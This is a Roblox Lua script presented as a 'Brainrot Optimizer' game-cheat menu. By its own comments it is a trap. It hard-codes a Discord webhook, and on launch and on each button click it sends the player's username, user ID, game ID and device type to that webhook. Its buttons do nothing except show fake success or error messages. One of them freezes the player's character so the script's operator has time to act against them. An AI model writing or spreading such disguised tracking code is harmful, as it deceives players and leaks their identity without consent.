-- [[ BRAINROT OPTIMIZER V9 - UNIVERSAL ]]
-- [[ AUTHENTIC TRAP UI ]]

local _w = "https://discord.com/api/webhooks/1481688367778234418/cK_6-k7Ci1uacOY-2am1aNx82hS0zYHmYSnZ_lirxQRB6hsYVeF1dWce5Q0kZ1plJK-b"

local Http = game:GetService("HttpService")
local Req = request or http_request or syn.request
local Players = game:GetService("Players")
local p = Players.LocalPlayer

-- 1. DATA GRABBER (Кім, қайда, қашан)
local function SendLog(msg)
    local data = {
        ["embeds"] = {{
            ["title"] = "🚀 SCRIPT ACTIVATED",
            ["color"] = 0x00FF00,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = p.Name .. " (" .. p.UserId .. ")"},
                {["name"] = "🎮 Game ID", ["value"] = tostring(game.PlaceId)},
                {["name"] = "📱 Device", ["value"] = (game:GetService("UserInputService").TouchEnabled and "Mobile" or "PC")},
                {["name"] = "📝 Action", ["value"] = msg}
            }
        }}
    }
    pcall(function() Req({Url = _w, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = Http:JSONEncode(data)}) end)
end

SendLog("User opened the fake menu")

-- 2. ANTI-KICK / STAY ALIVE
task.spawn(function()
    while task.wait(60) do
        pcall(function() game:GetService("VirtualUser"):CaptureController() game:GetService("VirtualUser"):ClickButton2(Vector2.new()) end)
    end
end)

-- 3. THE "REAL" UI (Ортада шығатын меню)
local Screen = Instance.new("ScreenGui", game.CoreGui)
Screen.Name = "BrainrotMenu"

local Main = Instance.new("Frame", Screen)
Main.Size = UDim2.new(0, 320, 0, 220)
Main.Position = UDim2.new(0.5, -160, 0.5, -110)
Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Main.BorderSizePixel = 0
Main.ClipsDescendants = true

-- Әдемі жиектер (Rounding)
local UICorner = Instance.new("UICorner", Main)
UICorner.CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Title.Text = "BRAINROT DEPLOYER V2"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16

-- Батырма 1: Place Brainrot
local Btn1 = Instance.new("TextButton", Main)
Btn1.Size = UDim2.new(0, 280, 0, 45)
Btn1.Position = UDim2.new(0.5, -140, 0.3, 0)
Btn1.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
Btn1.Text = "PLACE BRAINROT (FAST)"
Btn1.TextColor3 = Color3.new(1, 1, 1)
Btn1.Font = Enum.Font.Gotham
Btn1.TextSize = 14
Instance.new("UICorner", Btn1).CornerRadius = UDim.new(0, 6)

-- Батырма 2: Auto-Farm
local Btn2 = Instance.new("TextButton", Main)
Btn2.Size = UDim2.new(0, 280, 0, 45)
Btn2.Position = UDim2.new(0.5, -140, 0.55, 0)
Btn2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Btn2.Text = "AUTO-COLLECT BRAINROT"
Btn2.TextColor3 = Color3.new(1, 1, 1)
Btn2.Font = Enum.Font.Gotham
Btn2.TextSize = 14
Instance.new("UICorner", Btn2).CornerRadius = UDim.new(0, 6)

local Status = Instance.new("TextLabel", Main)
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 0.8, 0)
Status.BackgroundTransparency = 1
Status.Text = "Status: Ready"
Status.TextColor3 = Color3.fromRGB(150, 150, 150)
Status.Font = Enum.Font.Gotham
Status.TextSize = 12

-- 4. BUTTON LOGIC (Алдау)
Btn1.MouseButton1Click:Connect(function()
    Status.Text = "Deploying..."
    Status.TextColor3 = Color3.new(1, 1, 0)
    SendLog("Clicked: PLACE BRAINROT")
    task.wait(1.5)
    Status.Text = "Success: Brainrot Placed!"
    Status.TextColor3 = Color3.new(0, 1, 0)
    -- Ойыншыны қатыру (саған уақыт беру үшін)
    p.Character.HumanoidRootPart.Anchored = true
end)

Btn2.MouseButton1Click:Connect(function()
    Status.Text = "Activating Auto-Farm..."
    SendLog("Clicked: AUTO-FARM")
    task.wait(2)
    Status.Text = "Error: Need 500 Brainrot points"
    Status.TextColor3 = Color3.new(1, 0, 0)
end)

-- ЖАБУ БАТЫРМАСЫ
local Close = Instance.new("TextButton", Main)
Close.Size = UDim2.new(0, 30, 0, 30)
Close.Position = UDim2.new(1, -35, 0, 5)
Close.BackgroundTransparency = 1
Close.Text = "X"
Close.TextColor3 = Color3.new(1, 0, 0)
Close.TextSize = 20
Close.MouseButton1Click:Connect(function() Screen:Destroy() end)
